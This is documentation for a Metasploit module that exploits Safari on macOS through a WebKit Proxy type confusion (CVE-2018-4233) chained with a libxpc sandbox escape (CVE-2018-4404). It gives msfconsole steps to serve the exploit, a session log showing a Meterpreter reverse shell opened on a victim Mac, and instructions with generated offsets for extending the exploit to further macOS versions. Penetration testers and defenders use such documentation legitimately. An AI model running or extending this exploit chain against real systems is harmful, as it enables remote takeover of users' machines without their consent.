## Vulnerable Application

This module exploits a type confusion bug in the Javascript Proxy object in
WebKit. Safari on OSX 10.13.3 and lower are affected. The JS Proxy object
was introduced in Safari 10, so OSX 10.11 is not affected by the type
confusion, however the sandbox escape may still work.

The DFG JIT does not take into account that, through the use of a Proxy,
it is possible to run arbitrary JS code during the execution of a CreateThis
operation. This makes it possible to change the structure of e.g. an argument
without causing a bailout, leading to a type confusion (CVE-2018-4233).

The JIT region is then replaced with shellcode which loads the second stage.
The second stage exploits a logic error in libxpc, which uses command execution
via the launchd's "spawn_via_launchd" API (CVE-2018-4404).

## Verification Steps

1. Start `msfconsole`
1. `use exploit/osx/browser/safari_proxy_object_type_confusion`
1. `set LHOST <tab>`
1. `exploit`
1. Visit the URL on a vulnerable version of Safari

## Scenarios

### High Sierra 10.13

```
msf5 > use exploit/osx/browser/safari_proxy_object_type_confusion
msf5 exploit(osx/browser/safari_proxy_object_type_confusion) > set LHOST 192.168.0.2
LHOST => 192.168.0.2
msf5 exploit(osx/browser/safari_proxy_object_type_confusion) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf5 exploit(osx/browser/safari_proxy_object_type_confusion) >
[*] Started reverse TCP handler on 192.168.0.2:4444
[*] Using URL: http://0.0.0.0:8080/0PiuTy
[*] Local IP: http://192.168.0.2:8080/0PiuTy
[*] Server started.

msf5 exploit(osx/browser/safari_proxy_object_type_confusion) >
[*] 192.168.0.2   safari_proxy_object_type_confusion - Request from Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38
[*] Sending stage (53508 bytes) to 192.168.0.2
[*] Meterpreter session 1 opened (192.168.0.2:4444 -> 192.168.0.2:33200) at 2018-11-20 16:28:59 +0800

msf5 exploit(osx/browser/safari_proxy_object_type_confusion) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : Users-iMac.local
OS           : Darwin 17.0.0 Darwin Kernel Version 17.0.0: Thu Aug 24 21:48:19 PDT 2017; root:xnu-4570.1.46~2/RELEASE_X86_64
Architecture : x64
Meterpreter  : python/osx
```

### Adding offsets for new versions

Although all macOS versions from 10.12 -> 10.13.3 are vulnerable, some versions
are not supported. It's easy to add support for a vulnerable version by running
the script `external/source/exploits/CVE-2018-4404/gen_offsets.rb` on the
target version.

You will need to install the latest radare2 for the script to function.

```
$ git clone https://github.com/radare/radare2 && cd radare2 && ./sys/install.sh && cd ..`
$ ruby external/source/exploits/CVE-2018-4404/gen_offsets.rb
      '10.13' => {
        :dyld_stub_loader => '0x000012a8',
        :dlopen => '0x00002e60',
        :confstr => '0x000024fc',
        :strlen => '0x00001440',
        :strlen_got => '0xee8',
      },
```

The offset `:jsc_vtab` cannot be generated but you can guess it is either 0xe000 or 0xd000.
You can then add the offsets to the module:
`modules/exploits/osx/browser/safari_proxy_object_type_confusion.rb`

Please don't forget to contribute the offsets back to the framework if you have
successfully tested them.

